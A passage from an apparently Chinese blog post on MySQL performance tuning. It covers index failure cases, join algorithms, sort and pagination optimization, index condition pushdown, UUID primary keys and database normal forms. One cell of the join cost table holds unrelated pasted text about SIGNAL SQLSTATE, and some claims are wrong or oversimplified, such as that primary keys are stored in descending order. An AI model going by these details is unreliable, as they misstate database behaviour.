db,exec_count,tmp_tables,tmp_disk_tables,query</span><br><span class="line">from sys.statement_analysis where tmp_tables&gt;0 or tmp_disk_tables &gt;0</span><br><span class="line">order by (tmp_tables+tmp_disk_tables) desc;</span><br><span class="line"></span><br><span class="line">#1. 查看消耗磁盘IO的文件</span><br><span class="line">select file,avg_read,avg_write,avg_read+avg_write as avg_io</span><br><span class="line">from sys.io_global_by_file_by_bytes order by avg_read limit 10;</span><br><span class="line"></span><br><span class="line">#1. 行锁阻塞情况</span><br><span class="line">select * from sys.innodb_lock_waits;</span><br></pre></td></tr></table></figure>











<h2 id="索引优化和查询优化"><a href="#索引优化和查询优化" class="headerlink" title="索引优化和查询优化"></a>索引优化和查询优化</h2><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
<li>使用JOIN替换子查询</li>
<li>为JOIN的连接条件字段创建合适的索引</li>
<li>全值匹配最佳规则：查询条件包含多个字段，最好创建联合索引</li>
<li>最佳左前缀规则：联合索引中，最常用的字段应当排在最左边。</li>
<li>组合索引，范围查询的字段应当放在索引最后</li>
<li>为Order by、Where、Group By子句的字段建立索引：如果where子句的字段和order by子句字段相同，使用单列索引，否则使用联合索引。</li>
</ol>
<h3 id="索引失效案例"><a href="#索引失效案例" class="headerlink" title="索引失效案例"></a>索引失效案例</h3><p><strong>SQL是否使用索引，与数据库版本、数据量、数据选择度均有关系。</strong></p>
<ol>
<li><p>全值匹配最佳规则：查询条件包含多个字段，最好创建联合索引</p>
</li>
<li><p>最佳左前缀规则：联合索引中，最常用的字段应当排在最左边。</p>
</li>
<li><p>主键插入顺序：主键插入时应当尽可能从小到大的顺序，因为存储时是按主键从大到小的顺序的。</p>
</li>
<li><p>数据库和表的字符集应当统计，尽可能使用utf8mb4</p>
</li>
<li><p>计算、函数、类型转换（自动&#x2F;手动）导致的索引失效：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 在name字段有索引时：</span><br><span class="line">select * from student where name like &#x27;ab%&#x27;;		-- 较优 可以使用索引</span><br><span class="line">select * from student where LEFT(name,3) = &#x27;abc&#x27;;   -- 较差 无法使用索引</span><br><span class="line">select * from student where studentNo + 1 = 1001;   -- 不能使用索引 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>范围条件右边的列索引失效：经常范围查询的字段应当放到联合索引的最后，否则会导致此字段的右侧字段索引无法使用</p>
</li>
<li><p>不等于（!&#x3D;或&lt;&gt;)索引失效：</p>
</li>
<li><p><code>is null</code> 可以使用索引，<code>is not null</code> 不可以使用索引，<code>not like</code>同理：数据表最好有<code>not null</code>约束，null可以以实际值替代，如int以0表示，字符以“”表示。</p>
</li>
<li><p><code>like</code>以通配符<code>%</code>开头索引失效：</p>
</li>
<li><p><code>or</code>前后存在非索引列，索引失效</p>
</li>
</ol>
<p><strong>一般建议</strong></p>
<ul>
<li>单列索引，尽可能选择针对当前query过滤性最好的</li>
<li>组合索引，当前query过滤性最好的字段在最前面</li>
<li>组合索引，尽可能选择能够包含当前query中where子句的更多字段的索引</li>
<li>组合索引，范围查询的字段应当放在索引最后。</li>
</ul>
<h4 id="关联查询优化"><a href="#关联查询优化" class="headerlink" title="关联查询优化"></a>关联查询优化</h4><h4 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h4><ol>
<li>各表的连接条件字段应当保持类型一致。</li>
<li>外连接的情况下，左侧的必为驱动表，右侧必为被驱动表</li>
</ol>
<h4 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h4><ol>
<li>内连接的情况下，左右表地位一样，可能经过优化器优化后，左侧的表变成了被驱动表。</li>
</ol>
<blockquote>
<p>如果表的连接条件中只有一个字段拥有索引，拥有索引的字段所在的表为驱动表</p>
<p>如果表的连接条件中均没有索引，小表作为驱动表，“小表驱动大表”</p>
</blockquote>
<h4 id="JOIN-语句原理"><a href="#JOIN-语句原理" class="headerlink" title="JOIN 语句原理"></a>JOIN 语句原理</h4><p>假设驱动表有A条记录，被驱动表有B条记录。</p>
<h5 id="Simple-Nested-Loop-Join-（简单嵌套循环连接）"><a href="#Simple-Nested-Loop-Join-（简单嵌套循环连接）" class="headerlink" title="Simple Nested-Loop Join （简单嵌套循环连接）"></a>Simple Nested-Loop Join （简单嵌套循环连接）</h5><p>当连接的表均没有索引时</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241112224542.png"></p>
<p>在此情况下，性能极差，但显然驱动表A的记录越少，效率越高。</p>
<h5 id="Index-Nested-Loop-Join-（索引嵌套循环连接）"><a href="#Index-Nested-Loop-Join-（索引嵌套循环连接）" class="headerlink" title="Index Nested-Loop Join （索引嵌套循环连接）"></a>Index Nested-Loop Join （索引嵌套循环连接）</h5><p>此时被驱动表有索引：</p>
<p><img src="D:\workinenglish\typora_image\image-20241112225323050.png" alt="image-20241112225323050"></p>
<p>如果被驱动表加索引，效率有很大提高，但如果索引不是主键索引，还需要一次回表操作。</p>
<h5 id="Block-Nested-Loop-Join-（块嵌套循环连接）"><a href="#Block-Nested-Loop-Join-（块嵌套循环连接）" class="headerlink" title="Block  Nested-Loop Join （块嵌套循环连接）"></a>Block  Nested-Loop Join （块嵌套循环连接）</h5><p>MySQL8.0.20后删除此算法，使用HASH JOIN算法</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241113145255.png"></p>
<p>通过<code>show variables like &#39;%optimizer_switch%&#39;</code> 查看block_nested_loop，默认开启</p>
<p>默认情况下<code>join_buffer_size = 256k</code>。在32位操作系统中最大申请4G，64位操作系统下，仅windows可以申请超过4G</p>
<table>
<thead>
<tr>
<th>开销统计</th>
<th>SNLJ</th>
<th>INLJ</th>
<th>BNLJ</th>
</tr>
</thead>
<tbody><tr>
<td>外表扫描次数</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>内表扫描次数</td>
<td>A</td>
<td>xxxxxxxxxx – 用于存储过程和函数、触发器 45000可换为其他错误码SIGNAL SQLSTATE ‘45000’ SET MESSAGE_TEXT &#x3D; ‘自定义错误消息’;  sql</td>
<td>A*used_column_size&#x2F;join_buffer_size+1</td>
</tr>
<tr>
<td>读取记录次数</td>
<td>A+B*A</td>
<td>A+B(match)</td>
<td>A+B*(A*used_column_size&#x2F;join_buffer_size)</td>
</tr>
<tr>
<td>回表读取记录次数</td>
<td>0</td>
<td>A*Index(height)</td>
<td>B*A</td>
</tr>
<tr>
<td>JOIN比较次数</td>
<td>B*A</td>
<td>B(match)(if possible)</td>
<td>0</td>
</tr>
</tbody></table>
<p>整体效率：INLJ &gt; BNLJ &gt; SNLJ</p>
<p><strong>总结</strong></p>
<ul>
<li>保证被驱动表的JOIN字段已经创建了索引</li>
<li>需要JOIN 的字段，数据类型保持绝对一致。</li>
<li>LEFT JOIN 时，选择小表作为驱动表， 大表作为被驱动表 。减少外层循环的次数。</li>
<li>INNER JOIN 时，MySQL会自动将 小结果集的表选为驱动表 。选择相信MySQL优化策略。</li>
<li>能够直接多表关联的尽量直接关联，不用子查询。(减少查询的趟数)</li>
<li>不建议使用子查询，建议将子查询SQL拆开结合程序多次查询，或使用 JOIN 来代替子查询。</li>
<li>衍生表建不了索引</li>
</ul>
<h3 id="子查询优化"><a href="#子查询优化" class="headerlink" title="子查询优化"></a>子查询优化</h3><p>子查询的效率较低，这是因为：</p>
<ol>
<li>子查询需要为内层查询结果创建一个临时表，查询完毕后再撤销，占用大量CPU和IO资源</li>
<li>子查询产生的临时表不会存在索引表，查询效率低</li>
<li>结果集较大的子查询，对查询性能影响很大</li>
</ol>
<p><strong>应当尽量使用JOIN替代子查询</strong></p>
<h3 id="排序优化"><a href="#排序优化" class="headerlink" title="排序优化"></a>排序优化</h3><p><strong>业务中排序应当尽量放到程序端完成</strong></p>
<p>MySQL中支持两种排序方式，<code>FileSort</code>和<code>Index</code>:</p>
<ul>
<li>FileSort：在内存中进行，占用CPU较多，如果待排序结果集较大，可能还需要产生临时文件I&#x2F;O到磁盘中，效率低。</li>
<li>Index：索引可以保证数据有序，不需要再继续排序。</li>
</ul>
<p>因此，为Order by子句的字段建立索引，可以使得其在查询时的速度更快。</p>
<p>如果where子句的字段和order by子句字段相同，使用单列索引，否则使用联合索引。无法使用Index排序，需要对filesort进行优化。</p>
<p>排序索引的失效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student order by age,classId;</span><br><span class="line">-- 设有联合索引（age,classId），但由于查询的是全部数据，即使索引排序后还是需要回表获取数据，这个过程可能比获取全部数据后内存排序还慢。</span><br></pre></td></tr></table></figure>

<ol>
<li><p>查询的信息含有非索引字段并且没有limit，索引失效</p>
</li>
<li><p>order by时的规则与索引规则不一致：方向错误后顺序错误，索引均失效</p>
</li>
</ol>
<blockquote>
<p>顺序错误：排序时联合索引前面的字段不包含却包含后面的、字段顺序错误</p>
<p>方向错误：降序索引升序排列，升序索引降序排列</p>
</blockquote>
<ol start="3">
<li>无过滤，不索引。</li>
</ol>
<h4 id="filesort算法：双路排序和单路排序"><a href="#filesort算法：双路排序和单路排序" class="headerlink" title="filesort算法：双路排序和单路排序"></a>filesort算法：双路排序和单路排序</h4><p>双路排序（慢）：4.1在前使用，两次扫描磁盘，首先读取行指针和orderby字段并排序，读取到内存中，再从磁盘读取其他字段。</p>
<p>单路排序（快）：读取查询需要的所有列之后，在buffer中排序。需要更多的内存空间，但由于buffer有限，如果需要排序的数据超过buffer，就需要生成临时文件，反而增加I&#x2F;O开销。</p>
<p><strong>因此不得不使用filesort排序时，应当</strong></p>
<p><strong>1. 尽可能提高buffer的大小</strong></p>
<p><strong>2. 提高max_length_for_sort_data</strong></p>
<p>**3. 不要使用select * **</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;sort_buffer_size&#x27;;</span><br><span class="line">show variables like &#x27;max_length_for_sort_data&#x27;; --影响单双路排序的选择，如果排序字段长度大于此值，则偏向使用双路，默认1024B</span><br></pre></td></tr></table></figure>



<h3 id="Group-by优化"><a href="#Group-by优化" class="headerlink" title="Group by优化"></a>Group by优化</h3><p>与order by 类似，仍需注意：</p>
<ol>
<li>能使用where就用where，比having效率高</li>
<li>包含order by ,group by, distinct的语句，where过滤后结果应当不超过1000条，否则会导致SQL过慢。</li>
</ol>
<h3 id="分页查询优化"><a href="#分页查询优化" class="headerlink" title="分页查询优化"></a>分页查询优化</h3><p><strong>优化思路1：</strong>在索引上完成排序分页操作，最后根据主键关联回表查询需要的其他字段内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student t ,(select id from student order by id limit 2000000,10) a where a.id = t.id;</span><br></pre></td></tr></table></figure>

<p><strong>优化思路2：</strong>此方案适用于主键递增的表，将limit查询转换为某个位置的查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student where id &gt; 2000000 limit 10;</span><br></pre></td></tr></table></figure>



<h3 id="覆盖索引优先"><a href="#覆盖索引优先" class="headerlink" title="覆盖索引优先"></a>覆盖索引优先</h3><p>覆盖索引：</p>
<p><strong>理解方式一：</strong>索引是高效找到行的一个方法，但是一般数据库也能使用索引找到一个列的数据，因此它<br>不必读取整个行。毕竟索引叶子节点存储了它们索引的数据；当能通过读取索引就可以得到想要的数<br>据，那就不需要读取行了。一个索引包含了满足查询结果的数据就叫做覆盖索引。<br><strong>理解方式二：</strong>非聚簇复合索引的一种形式，它包括在查询里的SELECT、JOIN和WHERE子句用到的所有列<br>（即建索引的字段正好是覆盖查询条件中所涉及的字段）。</p>
<p>好处：</p>
<ol>
<li>避免Innodb表进行索引的二次查询（回表）</li>
<li>可以把随机IO变成顺序IO加快查询效率</li>
</ol>
<p>弊端：</p>
<ol>
<li>索引字段的维护 总是有代价的。因此，在建立冗余索引来支持覆盖索引时就需要权衡考虑了。这是业务<br> DBA，或者称为业务数据架构师的工作。</li>
</ol>
<h3 id="字符串的索引"><a href="#字符串的索引" class="headerlink" title="字符串的索引"></a>字符串的索引</h3><blockquote>
<p>使用前缀索引就用不上覆盖索引对查询性能的优化了，这也是你在选择是否使用前缀索引时需要考<br>虑的一个因素。</p>
</blockquote>
<h3 id="索引下推ICP"><a href="#索引下推ICP" class="headerlink" title="索引下推ICP"></a>索引下推ICP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from people where zipcode = &#x27;0001&#x27; and lastname like &#x27;%张%&#x27; and address like &#x27;%北京%&#x27;;  -- 存在联合索引（zipcode,lastname,firstname)</span><br></pre></td></tr></table></figure>

<p>索引下推（Index Condition Pushdown，简称ICP）是MySQL 5.6版本引入的一种数据查询优化技术。</p>
<p><strong>含有索引字段但索引又失效</strong></p>
<p>索引下推技术利用了数据库引擎中的索引和过滤条件，将部分过滤工作下推到存储引擎层面进行处理，从而减少不必要的数据读取和传输。在传统的查询执行过程中，数据库引擎首先根据索引定位到符合过滤条件的数据行，并将这些行读取到内存中，然后再进行进一步的过滤操作。而索引下推则在这一步骤中尽可能地将过滤操作下推到存储引擎层面，避免将不符合条件的数据行读取到内存中。</p>
<p>举例：</p>
<ol>
<li><strong>使用索引定位</strong>：首先，MySQL会使用<code>zipcode</code>上的索引来快速定位到<code>zipcode = &#39;0001&#39;</code>范围内的所有行。</li>
<li><strong>下推过滤条件</strong>：然后，MySQL会将<code>lastname like &#39;%张%&#39;</code>这个条件下推到存储引擎层（因为联合索引中包含了<code>lastname</code>列，但<code>like</code>子句导致又不能使用索引）。这意味着存储引擎在读取索引页时，会检查每个索引项是否满足<code>lastname like &#39;%张%</code>这个条件。只有满足条件的索引项才会被进一步处理，对应的数据行才会被读取到内存中。</li>
<li><strong>回表查询</strong>：经过<code>lastname like &#39;%张%</code>过滤之后，结果集更少，回表查询次数更少。</li>
<li><strong>减少数据读取</strong>：通过这种方式，MySQL可以减少不必要的数据读取和传输，因为存储引擎层已经根据索引和过滤条件过滤掉了一部分不符合条件的数据。</li>
</ol>
<h4 id="ICP的使用条件"><a href="#ICP的使用条件" class="headerlink" title="ICP的使用条件"></a>ICP的使用条件</h4><ol>
<li>访问表的类型必须是<code>range,ref,eq_ref,ref_or_null</code>之一</li>
<li>用于<code>innodb</code>或<code>MyISAM</code>引擎，</li>
<li><code>innodb</code>只用于<code>二级索引</code>，覆盖索引下不支持ICP（回表才能有ICP）</li>
<li>相关子查询条件不能使用ICP</li>
</ol>
<h4 id="ICP开启关闭"><a href="#ICP开启关闭" class="headerlink" title="ICP开启关闭"></a>ICP开启关闭</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set optimizer_switch = &#x27;index_condition_pushdown=on/off&#x27;</span><br><span class="line">-- 或在查询语句中添加/*+ no_icp(tablename)*/</span><br><span class="line">select /*+ no_icp(tablename)*/ * from tablename ...</span><br></pre></td></tr></table></figure>



<h3 id="普通索引和唯一索引"><a href="#普通索引和唯一索引" class="headerlink" title="普通索引和唯一索引"></a>普通索引和唯一索引</h3><h3 id="其他查询优化"><a href="#其他查询优化" class="headerlink" title="其他查询优化"></a>其他查询优化</h3><h4 id="EXISTS和IN的区分"><a href="#EXISTS和IN的区分" class="headerlink" title="EXISTS和IN的区分"></a>EXISTS和IN的区分</h4><p>索引是前提，小表驱动大表。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM A WHERE cc IN (SELECT cc FROM B);</span><br><span class="line">SELECT * FROM A WHERE EXISTS (SELECT cc FROM B WHERE B.cc = A.cc);</span><br></pre></td></tr></table></figure>

<p>当A小于B时，用EXISTS。因为EXISTS的首先，相当于外表循环，实现的逻辑类似于</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> B</span><br><span class="line">    	<span class="keyword">if</span> j.cc == i.cc then ...        </span><br></pre></td></tr></table></figure>

<p>当B小于A时用IN， 因为实现的逻辑类似于</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> B </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> A</span><br><span class="line">    	<span class="keyword">if</span> j.cc == i.cc then ...</span><br></pre></td></tr></table></figure>

<p>那个表小就用哪个表驱动，A表小用EXISTS,B表小用IN</p>
<h4 id="COUNT-和COUNT-字段-效率"><a href="#COUNT-和COUNT-字段-效率" class="headerlink" title="COUNT(*)和COUNT(字段)效率"></a>COUNT(*)和COUNT(字段)效率</h4><p>没有本质区别，主要看使用的存储引擎，innodb是O(n)，MyISAM是O(1)</p>
<p>在innodb中使用count(字段)是尽可能使用二级索引，因为主键使用聚簇索引，包含的信息太多。</p>
<h4 id="LIMIT-1-对优化的影响"><a href="#LIMIT-1-对优化的影响" class="headerlink" title="LIMIT 1 对优化的影响"></a>LIMIT 1 对优化的影响</h4><p>针对扫描全表的SQL语句，如果确定结果集只有一条，加上可以提高效率；对于建立唯一索引的字段，可以通过索引查询而不需要全表扫描，不必添加</p>
<h4 id="多用COMMIT"><a href="#多用COMMIT" class="headerlink" title="多用COMMIT"></a>多用COMMIT</h4><p>只要有可能，在程序中尽量多使用 COMMIT，这样程序的性能得到提高，需求也会因为 COMMIT 所释放<br>的资源而减少。<br>COMMIT 所释放的资源：</p>
<ol>
<li>回滚段上用于恢复数据的信息</li>
<li>被程序语句获得的锁</li>
<li>redo &#x2F; undo log buffer 中的空间</li>
<li>管理上述 3 种资源中的内部花费</li>
</ol>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ol>
<li>尽可能不使用select *</li>
</ol>
<h3 id="示例-淘宝数据库的主键设置"><a href="#示例-淘宝数据库的主键设置" class="headerlink" title="示例 - 淘宝数据库的主键设置"></a>示例 - 淘宝数据库的主键设置</h3><p>主键可以考虑哪些字段？</p>
<ol>
<li>自增ID：不行，问题见下文</li>
<li>业务字段：不行，无法预测未来业务字段是否会因为需求而出现重复。</li>
</ol>
<p>非核心业务如告警、日志、监控等信息可以使用自增ID</p>
<h4 id="核心业务的主键设计"><a href="#核心业务的主键设计" class="headerlink" title="核心业务的主键设计"></a>核心业务的主键设计</h4><p><strong>确保全局唯一并且单调递增：</strong>UUID</p>
<p>在极大量数据（10亿+）也可能出现重复的UUID.</p>
<p>UUID的构成：</p>
<blockquote>
<p>UUID(36B) &#x3D; 时间+UUID版本 (16B)  - 时钟序列(4B) - MAC地址(12B)  还需要4B存储4个 ‘-’</p>
<p>如： 40b826ac-a5b9-11ef-ab01-005056c00001  </p>
<p>时间低位32bit    时间中位16bit    时间高位 12bit  UUID版本4bit</p>
</blockquote>
<p><strong>为什么UUID是全局唯一的？</strong><br>在UUID中时间部分占用60位，存储的类似TIMESTAMP的时间戳，但表示的是从1582-10-15 00：00：00.00到现在的100ns的计数。可以看到UUID存储的时间精度比TIMESTAMPE更高，时间维度发生重复的概率降低到1&#x2F;100ns。<br>时钟序列是为了避免时钟被回拨导致产生时间重复的可能性。MAC地址用于全局唯一。<br><strong>为什么UUID占用36个字节？</strong><br>UUID根据字符串进行存储，设计时还带有无用”-“字符串，因此总共需要36个字节。<br><strong>为什么UUID是随机无序的呢？</strong><br>因为UUID的设计中，将时间低位放在最前面，而这部分的数据是一直在变化的，并且是无序。</p>
<p><strong>改造UUID</strong><br>若将时间高低位互换，则时间就是单调递增的了，也就变得单调递增了。MySQL 8.0可以更换时间低位和时间高位的存储方式，这样UUID就是有序的UUID了。MySQL 8.0还解决了UUID存在的空间占用的问题，除去了UUID字符串中无意义的”-“字符串，并且将字符串用二进制类型保存，这样存储空间降低为了<code>16字节</code>。<br>可以通过MySQL8.0提供的<code>uuid_to_bin</code>函数实现上述功能，同样的，MySQL也提供了<code>bin_to_uuid</code>函数进行<br>转化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET @uuid = UUID();</span><br><span class="line">SELECT @uuid,uuid_to_bin(@uuid),uuid_to_bin(@uuid,TRUE);</span><br></pre></td></tr></table></figure>

<p><strong>通过函数uuid_to_bin(@uuid,true)将UUID转化为有序UUID</strong></p>
<h4 id="自增ID的问题"><a href="#自增ID的问题" class="headerlink" title="自增ID的问题"></a>自增ID的问题</h4><p>除了简单，都是缺点：</p>
<ol>
<li>可靠性不高：存在回溯问题，8.0修复</li>
<li>安全性不高：暴露的接口很容易造成信息泄露</li>
<li>性能差</li>
<li>交互多：插入的时候还需要执行last_insert_id()函数获取刚插入的自增值，增加开销</li>
<li>局部唯一性：仅在当前数据库实例唯一而不是全局唯一，也就是说局部唯一性，这对分布式系统简直是噩梦</li>
</ol>
<h2 id="数据库设计规范"><a href="#数据库设计规范" class="headerlink" title="数据库设计规范"></a>数据库设计规范</h2><p>良好的数据库的设计要求：</p>
<ul>
<li>节省数据存储空间</li>
<li>保证数据完整性</li>
<li>方便进行数据库应用系统开发</li>
</ul>
<h3 id="键-码-和属性"><a href="#键-码-和属性" class="headerlink" title="键(码)和属性"></a>键(码)和属性</h3><table>
<thead>
<tr>
<th>类型</th>
<th>定义</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong>超键</strong></td>
<td>能唯一标识记录的字段或字段集合</td>
<td><code>(student_id)</code>, <code>(student_id, name)</code></td>
</tr>
<tr>
<td><strong>候选键</strong></td>
<td>超键的最小子集，无冗余字段</td>
<td><code>(student_id)</code></td>
</tr>
<tr>
<td><strong>主键</strong></td>
<td>从候选键中选出的唯一标识记录的键</td>
<td><code>student_id</code></td>
</tr>
<tr>
<td><strong>外键</strong></td>
<td>关联其他表主键，用于建立表之间的关系</td>
<td><code>student_id</code> 在 <code>Enrollments</code> 中</td>
</tr>
<tr>
<td><strong>主属性</strong></td>
<td>主键字段或候选键字段</td>
<td><code>student_id</code></td>
</tr>
<tr>
<td><strong>非主属性</strong></td>
<td>非主键字段，不用于唯一标识记录</td>
<td><code>name</code>, <code>email</code></td>
</tr>
</tbody></table>
<h3 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h3><p>在关系型数据库中，关于数据表设计的基本原则、规则就称为范式。可以理解为，一张数据表的设计结<br>构需要满足的某种设计标准的 级别 。要想设计一个结构合理的关系型数据库，必须满足一定的范式。</p>
<p>级别越高，冗余度越低，同时高阶范式必须满足低阶范式的要求。</p>
<p><strong>一般的关系型数据库最高遵循到BCNF，普遍为3NF。</strong></p>
<table>
<thead>
<tr>
<th>范式</th>
<th>主要目标</th>
<th>解决的问题</th>
<th>示例问题</th>
</tr>
</thead>
<tbody><tr>
<td><strong>1NF</strong></td>
<td>确保每列值是原子化的</td>
<td>列中包含多个值</td>
<td>一列记录多个课程名称</td>
</tr>
<tr>
<td><strong>2NF</strong></td>
<td>消除部分函数依赖</td>
<td>非主属性只依赖部分主键</td>
<td>教师信息依赖课程 ID</td>
</tr>
<tr>
<td><strong>3NF</strong></td>
<td>消除传递函数依赖</td>
<td>非主属性依赖其他非主属性</td>
<td>部门信息依赖教师信息</td>
</tr>
<tr>
<td><strong>BCNF</strong></td>
<td>消除主属性依赖于非主属性的情况</td>
<td>主属性依赖于非主属性</td>
<td>课程信息依赖教师信息</td>
</tr>
<tr>
<td><strong>4NF</strong></td>
<td>消除多值依赖</td>
<td>一个主键对应多个独立属性</td>
<td>学生课程和爱好独立相关性</td>
</tr>
<tr>
<td><strong>5NF</strong></td>
<td>消除连接依赖</td>
<td>数据表无法再分解</td>
<td>复杂的多对多关系</td>
</tr>
</tbody></table>
<hr>
<h4 id="1NF（第一范式）"><a href="#1NF（第一范式）" class="headerlink" title="1NF（第一范式）"></a><strong>1NF（第一范式）</strong></h4><p><strong>定义</strong>：表中的每一列只能包含<strong>单一值</strong>，即表是原子化的。<br><strong>要求</strong>：  </p>
<ol>
<li>表格中所有列的值都是不可再分的原子值。  </li>
<li>每一列的数据类型保持一致。</li>
</ol>
<p><strong>示例</strong>（未满足 1NF）：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Courses</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math, English</td>
</tr>
</tbody></table>
<p><strong>满足 1NF 后</strong>：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
</tr>
<tr>
<td>1</td>
<td>English</td>
</tr>
</tbody></table>
<hr>
<h4 id="2NF（第二范式）"><a href="#2NF（第二范式）" class="headerlink" title="2NF（第二范式）"></a><strong>2NF（第二范式）</strong></h4><p><strong>定义</strong>：在满足 1NF 的基础上，消除<strong>部分函数依赖</strong>，即非主属性完全依赖于主键。<br><strong>要求</strong>：  </p>
<ol>
<li>表必须已经满足 1NF。  </li>
<li>非主属性必须依赖于整个主键，而不是主键的一部分（在复合主键的情况下）。</li>
</ol>
<p><strong>部分函数依赖导致的问题</strong></p>
<p>假设有比赛表，字段包含球员编号、姓名、年龄、比赛编号，时间，场地等</p>
<ol>
<li>数据冗余：一个球员参加多场比赛，其姓名年龄多次出现</li>
<li>插入异常：一场未确定参赛人员的比赛无法添加</li>
<li>删除异常：一场已确定但参赛人员没有的比赛会被删除</li>
<li>更新异常：同一场比赛时间一修改就得修改多条信息</li>
</ol>
<p><strong>示例</strong>（未满足 2NF）：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course_ID</th>
<th>Teacher</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
<td>Dr. Smith</td>
</tr>
<tr>
<td>1</td>
<td>English</td>
<td>Dr. Brown</td>
</tr>
</tbody></table>
<p><strong>问题</strong>：<code>Teacher</code> 依赖于 <code>Course_ID</code>，而不是整个主键 <code>Student_ID, Course_ID</code>。<br><strong>满足 2NF 后</strong>：<br>将表拆分：  </p>
<ol>
<li><strong>Student-Course 表</strong>：  <table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course_ID</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
</tr>
</tbody></table>
</li>
</ol>
<p>| 1          | English   |</p>
<ol start="2">
<li><strong>Course-Teacher 表</strong>：  <table>
<thead>
<tr>
<th>Course_ID</th>
<th>Teacher</th>
</tr>
</thead>
<tbody><tr>
<td>Math</td>
<td>Dr. Smith</td>
</tr>
<tr>
<td>English</td>
<td>Dr. Brown</td>
</tr>
</tbody></table>
</li>
</ol>
<hr>
<h4 id="3NF（第三范式）"><a href="#3NF（第三范式）" class="headerlink" title="3NF（第三范式）"></a><strong>3NF（第三范式）</strong></h4><p><strong>定义</strong>：在满足 2NF 的基础上，消除<strong>传递函数依赖</strong>，即非主属性不能依赖于其他非主属性。<br><strong>要求</strong>：  </p>
<ol>
<li>表必须已经满足 2NF。  </li>
<li>非主属性之间不能有传递依赖。</li>
</ol>
<p><strong>示例</strong>（未满足 3NF）：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course_ID</th>
<th>Teacher</th>
<th>Department</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
<td>Dr. Smith</td>
<td>Math Dept</td>
</tr>
<tr>
<td>1</td>
<td>English</td>
<td>Dr. Brown</td>
<td>English Dept</td>
</tr>
</tbody></table>
<p><strong>问题</strong>：<code>Department</code> 依赖于 <code>Teacher</code>，而不是 <code>Student_ID, Course_ID</code>。<br><strong>满足 3NF 后</strong>：<br>拆分为两张表：  </p>
<ol>
<li><strong>Student-Course 表</strong>：  <table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course_ID</th>
<th>Teacher</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
<td>Dr. Smith</td>
</tr>
</tbody></table>
</li>
</ol>
<p>| 1          | English   | Dr. Brown |</p>
<ol start="2">
<li><strong>Teacher-Department 表</strong>：  <table>
<thead>
<tr>
<th>Teacher</th>
<th>Department</th>
</tr>
</thead>
<tbody><tr>
<td>Dr. Smith</td>
<td>Math Dept</td>
</tr>
<tr>
<td>Dr. Brown</td>
<td>English Dept</td>
</tr>
</tbody></table>
</li>
</ol>
<hr>
<h4 id="BCNF（Boyce-Codd范式）"><a href="#BCNF（Boyce-Codd范式）" class="headerlink" title="BCNF（Boyce-Codd范式）"></a><strong>BCNF（Boyce-Codd范式）</strong></h4><p><strong>定义</strong>：在满足 3NF 的基础上，主属性不能依赖于非主属性。<br><strong>要求</strong>：  </p>
<ol>
<li>表必须已经满足 3NF。  </li>
<li>如果一个非主属性可以决定主属性，则违反 BCNF。</li>
</ol>
<p><strong>示例</strong>（未满足 BCNF）：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course_ID</th>
<th>Teacher</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
<td>Dr. Smith</td>
</tr>
<tr>
<td>2</td>
<td>Math</td>
<td>Dr. Smith</td>
</tr>
</tbody></table>
<p><strong>问题</strong>：<code>Teacher</code> 可以决定 <code>Course_ID</code>，但它不是主键。<br><strong>满足 BCNF 后</strong>：<br>拆分为两张表：  </p>
<ol>
<li><p><strong>Teacher-Course 表</strong>：  </p>
<table>
<thead>
<tr>
<th>Teacher</th>
<th>Course_ID</th>
</tr>
</thead>
<tbody><tr>
<td>Dr. Smith</td>
<td>Math</td>
</tr>
</tbody></table>
</li>
<li><p><strong>Student-Teacher 表</strong>：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Teacher</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Dr. Smith</td>
</tr>
</tbody></table>
</li>
</ol>
<p>| 2          | Dr. Smith |</p>
<hr>
